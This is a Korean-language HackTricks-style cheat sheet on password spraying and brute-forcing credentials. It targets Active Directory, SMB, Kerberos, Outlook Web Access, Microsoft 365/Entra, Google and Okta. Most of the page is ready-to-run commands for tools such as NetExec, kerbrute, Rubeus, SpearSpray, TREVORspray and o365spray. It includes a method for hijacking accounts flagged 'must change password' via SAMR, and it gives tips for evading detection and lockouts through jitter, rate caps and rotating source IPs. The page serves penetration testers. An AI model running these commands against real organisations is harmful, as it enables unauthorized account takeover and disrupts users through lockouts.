# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

여러 **valid usernames**를 찾았다면, 발견한 각 사용자에게 가장 **common passwords**를 시도할 수 있습니다(환경의 password policy를 고려해야 합니다).\
**default**로 **minimum** **password** **length**는 **7**입니다.

일반적인 username 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

**여러 개의 잘못된 password를 시도하면 일부 계정이 lockout될 수 있습니다**(default로 10개 초과).

### password policy 가져오기

일부 사용자 credentials 또는 domain user로서의 shell이 있다면 다음을 사용하여 **password policy를 가져올 수 있습니다**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux에서의 Exploitation (또는 전체)

- **crackmapexec** 사용:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- SMB/WinRM 전반에서 대상 지정 저소음 password spraying에 **NetExec (CME successor)** 사용:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) 사용
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(계정 잠금을 방지하기 위해 시도 횟수를 지정할 수 있음):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - 권장하지 않음. 때때로 작동하지 않음<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**의 `scanner/smb/smb_login` module 사용:

![Password Spraying - Brute-Force: Metasploit의 scanner/smb/smb login module 사용](<../../images/image (745).png>)

- **rpcclient** 사용:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows에서

- brute module이 포함된 [Rubeus](https://github.com/Zer1t0/Rubeus) 버전:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)을 사용하면 (기본적으로 도메인에서 사용자를 생성할 수 있으며, 도메인에서 password policy를 가져와 이에 따라 시도 횟수를 제한합니다):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) 사용
```
Invoke-SprayEmptyPassword
```
### "다음 로그온 시 암호를 변경해야 함" 계정 식별 및 탈취 (SAMR)

낮은 노이즈의 technique은 무해한/빈 암호를 spray하고 STATUS_PASSWORD_MUST_CHANGE를 반환하는 계정을 찾아내는 것입니다. 이는 암호가 강제로 만료되었으며 이전 암호를 몰라도 암호를 변경할 수 있음을 나타냅니다.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- 사용자를 열거하여(SAMR을 통한 RID brute) target list를 구성합니다:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- 빈 비밀번호로 Spray하고, 다음 로그인 시 비밀번호를 변경해야 하는 계정을 확보하기 위해 성공한 계정에 대해서도 계속 진행합니다:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 각 hit마다 NetExec의 module을 사용하여 SAMR을 통해 password를 변경합니다("must change"가 설정된 경우 기존 password는 필요하지 않음):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
운영 참고 사항:
- Kerberos 기반 작업을 수행하기 전에 호스트 clock이 DC와 동기화되어 있는지 확인하세요: `sudo ntpdate <dc_fqdn>`.
- 일부 모듈(예: RDP/WinRM)에서 (Pwn3d!)가 없는 [+]는 creds가 유효하지만 해당 계정에 interactive logon 권한이 없음을 의미합니다.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### LDAP targeting 및 PSO-aware throttling을 활용한 Kerberos pre-auth spraying (SpearSpray)

Kerberos pre-auth 기반 spraying은 SMB/NTLM/LDAP bind 시도보다 noise를 줄이고 AD lockout 정책에 더 잘 맞습니다. SpearSpray는 LDAP 기반 targeting, pattern engine, policy awareness(domain policy + PSO + badPwdCount buffer)를 결합하여 정확하고 안전하게 spraying을 수행합니다. 또한 BloodHound pathing을 위해 Neo4j에서 compromised principal에 tag를 지정할 수도 있습니다.<sup>[[1]](#references)</sup>

주요 아이디어:
- paging 및 LDAPS support를 제공하는 LDAP user discovery와 custom LDAP filters를 선택적으로 사용할 수 있습니다.
- Domain lockout policy 및 PSO-aware filtering을 통해 configurable attempt buffer(threshold)를 남겨 사용자가 lockout되지 않도록 합니다.
- fast gssapi bindings를 사용하는 Kerberos pre-auth validation(4625 대신 DC에서 4768/4771 생성).
- 각 사용자의 pwdLastSet에서 파생된 names 및 temporal values 같은 variables를 사용하는 pattern-based, per-user password generation.
- threads, jitter 및 초당 최대 요청 수(max requests per second)를 통한 throughput control.
- BloodHound를 위해 owned users를 표시하는 선택적 Neo4j integration.

기본 사용법 및 discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
대상 지정 및 패턴 제어:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
은밀성 및 안전성 제어:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 데이터 보강:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
패턴 시스템 개요 (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
사용 가능한 변수:
- {name}, {samaccountname}
- 각 사용자의 pwdLastSet (또는 whenCreated)의 시간 정보: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- 구성 helper 및 조직 token: {separator}, {suffix}, {extra}

운영 참고 사항:

- 가장 신뢰할 수 있는 badPwdCount 및 policy 관련 정보를 읽으려면 -dc를 사용하여 PDC-emulator를 쿼리하는 것을 우선합니다.
- badPwdCount reset은 observation window 이후 다음 시도에서 트리거됩니다. 안전을 유지하려면 threshold 및 timing을 사용합니다.
- Kerberos pre-auth 시도는 DC telemetry에서 4768/4771로 나타납니다. 정상 트래픽에 섞이도록 jitter 및 rate-limiting을 사용합니다.

> Tip: SpearSpray의 기본 LDAP page size는 200입니다. 필요에 따라 -lps로 조정합니다.

## Outlook Web Access

**password spraying outlook**을 위한 여러 도구가 있습니다.

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) 사용
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) 사용
- [Ruler](https://github.com/sensepost/ruler) 사용 (reliable!)<sup>[[5]](#references)</sup>
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 사용 (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) 사용 (Powershell)

이러한 도구를 사용하려면 user list와 password 하나 또는 spray할 소규모 password list가 필요합니다.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Cloud spraying의 경우 먼저 테넌트가 **managed**, **federated**, **hybrid** 중 무엇인지 식별해야 합니다. endpoint와 lockout 동작이 on-prem AD와 다를 수 있기 때문입니다. Microsoft Entra에서는 **Smart Lockout**이 반복적인 추측으로 lockout budget을 소모하는 방식을 변경합니다:<sup>[[7]](#references)</sup>

- **동일한 잘못된 password**를 반복해도 lockout counter가 계속 증가하지 않지만, **새로운 후보**를 시도하면 증가합니다.
- **익숙한** 위치와 **익숙하지 않은** 위치에는 서로 별도의 counter가 있습니다.
- **pass-through authentication (PTA)**을 사용하는 테넌트는 잘못된 password hash tracking의 이점을 얻지 못하므로, classic lockout에 민감한 target과 유사하게 취급해야 합니다.

실제로는 **라운드마다 password 하나**만 spray하고, 라운드 사이에 충분한 간격을 두며, 추측을 전송하기 전에 테넌트의 실제 auth flow를 확인할 수 있는 tooling을 우선 사용하세요.

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray)를 사용하면 테넌트에 대해 recon을 수행하고, `token_endpoint`를 확인하며, `msol`/`adfs`/`owa`/`okta`를 spray하고, 여러 egress IP를 통해 traffic을 rotate할 수 있습니다:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365)를 사용하면 재개 가능한 **실행 계획**을 미리 구축하고, 인증 순서를 무작위화하며, lockout window를 벗어나도록 사용자별 **최소 지연 시간**을 적용할 수 있습니다:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray)를 사용하면 tenant를 검증하고, `onedrive`와 같은 모듈로 사용자를 열거하며, 잠금 기간마다 **사용자당 한 번의 시도**를 유지하면서 `oauth2` 또는 `adfs`를 통해 spray할 수 있습니다. 이미 FireProx API가 있다면 `--proxy-url`로 전달하여 소스 IP를 분산하세요:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
최근 operator tradecraft는 **distributed cloud spraying**으로도 발전했습니다. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration)은 time windows, password shuffling, ADFS/M365 spraying 및 automatic post-auth exfiltration을 지원합니다. 최근 실제 악용 사례에서는 **Microsoft Teams API** account enumeration과 **AWS region rotation**도 사용하여 여러 source geographies에 걸쳐 spray wave를 분산했습니다.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 참고 자료

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
